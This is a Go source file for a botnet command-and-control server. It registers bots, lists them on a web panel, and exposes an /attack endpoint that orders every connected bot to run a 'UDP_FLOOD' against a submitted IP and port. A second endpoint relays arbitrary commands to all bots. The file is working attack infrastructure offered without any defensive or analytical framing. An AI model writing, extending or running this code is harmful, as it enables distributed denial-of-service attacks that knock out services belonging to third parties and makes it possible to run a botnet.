package main

import (
	"fmt"
	"html/template"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

var templates *template.Template

const (
	c2Address = "localhost:8080" // Predefined IP address and port for the C2 server
)

func init() {
	templates = template.Must(template.ParseGlob("templates/*.html"))
}

type Bot struct {
	ID       string
	Address  string
	LastSeen time.Time
}

var connectedBots []*Bot

func homeHandler(w http.ResponseWriter, r *http.Request) {
	templates.ExecuteTemplate(w, "index.html", nil)
}

func c2Handler(w http.ResponseWriter, r *http.Request) {
	templates.ExecuteTemplate(w, "c2.html", connectedBots)
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	templates.ExecuteTemplate(w, "attack.html", nil)
}

func startAttackHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		targetIP := r.FormValue("target_ip")
		targetPort := r.FormValue("target_port")

		// Validate the target IP and port here if needed

		// Send the UDP_FLOOD command to all connected bots
		command := fmt.Sprintf("UDP_FLOOD %s %s", targetIP, targetPort)
		for _, bot := range connectedBots {
			sendUDPPacketToBot(bot, command)
		}

		fmt.Fprintln(w, "UDP flood attack started on all connected bots.")
	}
}

func registerBotHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		botID := r.FormValue("bot_id")
		botAddress := r.FormValue("bot_address")

		// Check if the bot is already registered
		for _, bot := range connectedBots {
			if bot.ID == botID {
				// Update the bot's last seen time
				bot.LastSeen = time.Now()
				fmt.Fprintln(w, "Bot already registered. Refresh to update last seen time.")
				return
			}
		}

		// If not already registered, add the bot to the list
		connectedBots = append(connectedBots, &Bot{
			ID:       botID,
			Address:  botAddress,
			LastSeen: time.Now(),
		})

		fmt.Fprintln(w, "Bot registered successfully.")
	}
}

func udpCommandHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		command := r.FormValue("command")

		// Send the UDP command to all connected bots
		for _, bot := range connectedBots {
			sendUDPPacketToBot(bot, command)
		}

		fmt.Fprintln(w, "UDP command sent to all connected bots.")
	}
}

func sendUDPPacketToBot(bot *Bot, command string) {
	udpAddr, err := net.ResolveUDPAddr("udp", bot.Address)
	if err != nil {
		fmt.Printf("Error resolving UDP address for Bot %s: %v\n", bot.ID, err)
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		fmt.Printf("Error dialing UDP for Bot %s: %v\n", bot.ID, err)
		return
	}
	defer conn.Close()

	_, err = conn.Write([]byte(command))
	if err != nil {
		fmt.Printf("Error sending UDP packet to Bot %s: %v\n", bot.ID, err)
		return
	}

	fmt.Printf("UDP packet sent to Bot %s\n", bot.ID)
}

func main() {
	router := mux.NewRouter()

	router.HandleFunc("/", homeHandler).Methods("GET")
	router.HandleFunc("/c2", c2Handler).Methods("GET")
	router.HandleFunc("/attack", attackHandler).Methods("GET")
	router.HandleFunc("/attack", startAttackHandler).Methods("POST")
	router.HandleFunc("/register", registerBotHandler).Methods("POST")
	router.HandleFunc("/udp", udpCommandHandler).Methods("POST")

	http.Handle("/", router)

	fmt.Println("Starting C2 server on", c2Address)
	http.ListenAndServe(c2Address, nil)
}
